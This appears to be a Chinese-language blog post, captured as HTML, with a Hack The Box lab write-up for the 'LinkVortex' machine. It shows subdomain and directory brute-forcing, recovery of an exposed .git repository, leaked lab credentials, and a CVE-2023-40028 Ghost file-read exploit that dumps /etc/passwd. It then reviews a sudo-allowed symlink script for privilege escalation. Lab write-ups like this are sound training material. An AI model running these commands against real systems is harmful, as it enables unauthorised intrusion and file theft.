@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="redpomelo">
+    
+    <title>
+        
+            [HTB]LinkVortex WriteUp |
+        
+        红柚的学习小站(=^-ω-^=)
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/favicon.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"rp-sec.top","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"红柚的学习小站(=^-ω-^=)","author":"redpomelo","avatar":"https://q1.qlogo.cn/g?b=qq&nk=3024951439&s=640","logo":"/images/logo.ico","favicon":"/images/favicon.svg"},"menu":{"home":"/","archives":"/archives","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.webp","background_img_dark":"/images/bg.svg","description":"且视他人之疑目如盏盏鬼火 || 大胆地去走你的夜路","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/saqy2","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"georgephillips4264@gmail.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"twikoo","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":"https://rpsec.netlify.app/.netlify/functions/twikoo","region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2024,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/custom.css"],"js":[null]},"root":"","source_data":{"links":[{"title":"朋友们 (暂无)"},{"name":"test","link":"https://baidu.com","description":"test","avatar":null}]},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.ico">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               红柚的学习小站(=^-ω-^=)
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        [HTB]LinkVortex WriteUp
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://q1.qlogo.cn/g?b=qq&nk=3024951439&s=640">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">redpomelo</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-12-14 20:03:04</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Dec 14 2024 20:38:52 GMT+0800">2024-12-14 20:38:52</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/HTB/">HTB</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
+            </span>
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天来玩一下靶机，记录一下</p>
+<p>靶机地址：<a class="link" target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/LinkVortex">https://app.hackthebox.com/machines/LinkVortex<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214162327733.png" alt="image-20241214162327733"></p>
+<p>开局给了一个IP地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> nmap 10.10.11.47 --min-rate 10000 -sS -sV -O -p- </span><br></pre></td></tr></table></figure>
+
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>使用Nmap用半开放式扫描进行端口探测，并探测系统版本</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214163807087.png" alt="image-20241214163807087"></p>
+<p>最终得到了以上结果，可以见到开放了80和22端口，说明是有http服务存在的，尝试直接访问网站，这边直接跳转到了一个网址<a class="link" target="_blank" rel="noopener" href="http://linkvortex.htb/%EF%BC%8C%E4%BD%86%E6%98%AF%E6%89%93%E4%B8%8D%E5%BC%80%EF%BC%8C%E5%B0%9D%E8%AF%95%E6%8A%8Aip%E5%9C%B0%E5%9D%80%E5%8A%A0%E5%85%A5%E5%88%B0hosts%E9%87%8C%E9%9D%A2">http://linkvortex.htb/，但是打不开，尝试把ip地址加入到hosts里面<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214164108104.png" alt="image-20241214164108104"></p>
+<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p>现在在进行访问就是正确的内容了，大概翻看了一下，没有得到什么有价值的信息</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214164133079.png" alt="image-20241214164133079"></p>
+<p>根据网页最右下角的版权信息（Powered by Ghost）可以知道这用了一个叫做Ghost的CMS搭建，既然他给了域名那肯定不是白给的，尝试对子域名进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿redpomelo)-[~]                            │</span><br><span class="line">└─$ ffuf -c -u http://linkvortex.htb/ -H &quot;HOST:FUZZ.│</span><br><span class="line">linkvortex.htb&quot; -w ~/tools/Subdomain_List/subdomains│</span><br><span class="line">.txt -fc 301 </span><br></pre></td></tr></table></figure>
+
+<p>成功找到了子域名.dev，同时附上我所使用的子域名字典：<a class="link" target="_blank" rel="noopener" href="https://github.com/DictionaryHouse/Subdomain_List">点击访问<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214165205463.png" alt="image-20241214165205463"></p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>找到子域的同时，修改hosts文件把找到的子域丢进去，然后对子域名进行一波目录爆破看看能不能找到什么有价值的信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿redpomelo)-[~]</span><br><span class="line">└─$ sudo gobuster dir -u http://dev.linkvortex.htb/ -w ~/tools/scan-dictmaster/dir.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214165725552.png" alt="image-20241214165725552"></p>
+<p>找到两个，这个git文件就很有意思</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214170120939.png" alt="image-20241214170120939"></p>
+<p>查阅资料，知道了有个项目叫GitHack,它从.git 文件夹重建源代码，同时保持目录结构不变。</p>
+<p>项目链接：<a class="link" target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHack.py http://dev.linkvortex.htb/.git/</span><br></pre></td></tr></table></figure>
+
+<p>使用如上命令把他的整个项目源代码恢复下来</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214170917830.png" alt="image-20241214170917830"></p>
+<p>里面全是文件夹，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/kali/tools/GitHack/dev.linkvortex.htb/ghost/core/test/regression/api/admin</span><br></pre></td></tr></table></figure>
+
+<p>只有这个目录有个js文件，查看后发现有很多password关键字<img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214171602573.png" alt="image-20241214171602573"></p>
+<p>网上搜了下这个CMS的后台地址</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214171853291.png" alt="image-20241214171853291"></p>
+<p>随便找了几个账密试了一下，但是试了几下都没试出来，红温了，写个脚本提取里面的账密用burp全部跑了一遍发现都没有进去，这时候开始观察账户名是否是错的，发现那个文件里的都是@example.com后缀，遂尝试<a class="link" href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6c;&#105;&#x6e;&#107;&#118;&#x6f;&#114;&#116;&#x65;&#x78;&#x2e;&#x68;&#116;&#x62;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6c;&#105;&#x6e;&#107;&#118;&#x6f;&#114;&#116;&#x65;&#x78;&#x2e;&#x68;&#116;&#x62;<i class="fas fa-external-link-alt"></i></a></p>
+<p>和第一个密码进行登录，然后就进入后台了</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin@linkvortex.htb</span><br><span class="line">password: OctopiFociPilfer45</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174031738.png" alt="image-20241214174031738"></p>
+<p>进入后台溜达了一下发现没有什么东西，之前找到的git文件可以看得见这个CMS的版本号是5.58，遂上网查一下公开漏洞</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174141719.png" alt="image-20241214174141719"></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://security.snyk.io/package/npm/ghost/5.58.0">https://security.snyk.io/package/npm/ghost/5.58.0<i class="fas fa-external-link-alt"></i></a></p>
+<p>在以上站点可以看得到5.58这个版本存在的公开漏洞，大多数都是些xss什么的，没啥利用价值，只有一个任意文件读取值得一看</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174344547.png" alt="image-20241214174344547"></p>
+<p>点进去知悉此漏洞编号是<a class="link" target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2023-40028">CVE-2023-40028 (opens in a new tab)<i class="fas fa-external-link-alt"></i></a>，在google查找CVE-2023-40028 Github找到了<a class="link" target="_blank" rel="noopener" href="https://github.com/0xyassine/CVE-2023-40028">POC<i class="fas fa-external-link-alt"></i></a> 下载下来</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174755384.png" alt="image-20241214174755384"></p>
+<p>修改POC脚本中的参数为我们的目标</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@redpomelo] /home/kali/temp </span><br><span class="line">❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line">WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line">file&gt; /etc/passwd</span><br><span class="line"> </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>成功读取到了&#x2F;etc&#x2F;passwd，在之前我们用GitHack弄出来的文件中还有一个Dockerfile</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195315043.png" alt="image-20241214180453434"></p>
+<p>这里的名字长得就像是配置文件，查看后得到用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:bob@linkvortex.htb</span><br><span class="line">password:fibber-talented-worth</span><br></pre></td></tr></table></figure>
+
+<p>尝试ssh登录</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214181807665.png" alt="image-20241214181807665"></p>
+<p>卡了一个多小时没连上去，心态炸了</p>
+<p>用HTB的盒子连上去了，成功进入系统，</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214194847592.png" alt="image-20241214194847592"></p>
+<p>成功拿到flag~</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>速度得快点了，免费的盒子只有几分钟时间，快到期了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty, env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l检查当前用户的权限，发现可以访问&#x2F;opt&#x2F;ghost&#x2F;clean_symlink.sh *.png</p>
+<p>看一下这是个啥东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">cat</span> /opt/ghost/clean_symlink.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">QUAR_DIR=<span class="string">&quot;/var/quarantined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$CHECK_CONTENT</span> ];<span class="keyword">then</span></span><br><span class="line">  CHECK_CONTENT=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">LINK=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="string">&quot;<span class="variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;! First argument must be a png file !&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="variable">$LINK</span>;<span class="keyword">then</span></span><br><span class="line">  LINK_NAME=$(/usr/bin/basename <span class="variable">$LINK</span>)</span><br><span class="line">  LINK_TARGET=$(/usr/bin/readlink <span class="variable">$LINK</span>)</span><br><span class="line">  <span class="keyword">if</span> /usr/bin/echo <span class="string">&quot;<span class="variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="string">&#x27;(etc|root)&#x27;</span>;<span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;! Trying to read critical files, removing link [ <span class="variable">$LINK</span> ] !&quot;</span></span><br><span class="line">    /usr/bin/unlink <span class="variable">$LINK</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Link found [ <span class="variable">$LINK</span> ] , moving it to quarantine&quot;</span></span><br><span class="line">    /usr/bin/mv <span class="variable">$LINK</span> <span class="variable">$QUAR_DIR</span>/</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$CHECK_CONTENT</span>;<span class="keyword">then</span></span><br><span class="line">      /usr/bin/echo <span class="string">&quot;Content:&quot;</span></span><br><span class="line">      /usr/bin/cat <span class="variable">$QUAR_DIR</span>/<span class="variable">$LINK_NAME</span> 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195315043.png" alt="image-20241214195315043"></p>
+<p>喂给AI来解答</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195656225.png" alt="image-20241214195656225"></p>
+<p>这样就拿到了FLag</p>
+<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195607836.png" alt="image-20241214195607836"></p>
+<p>至此就拿下全部Flag咯</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前期都是简简单单的信息搜集，提权部分不像传统信息搜集，这个靶机还是偏入门,没有涉及什么很超纲的知识点</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/HTB/">HTB</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"
+                                   title="Shiro550漏洞分析复现"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Shiro550漏洞分析复现</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="twikoo-container">
+        <div id="twikoo-comment"></div>
+        <script 
+                src="//cdn.jsdelivr.net/npm/twikoo@1.6.39/dist/twikoo.all.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initTwikoo = () => {
+            if (window?.twikoo) {
+              twikoo.init({
+                el: '#twikoo-comment',
+                envId: 'https://rpsec.netlify.app/.netlify/functions/twikoo',
+                region: '',
+                lang: 'zh-CN' || 'zh-CN'
+              })
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initTwikoo()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initTwikoo()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initTwikoo)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="nav-text">渗透过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F"><span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="nav-text">子域名爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="nav-text">目录爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="nav-text">进入后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
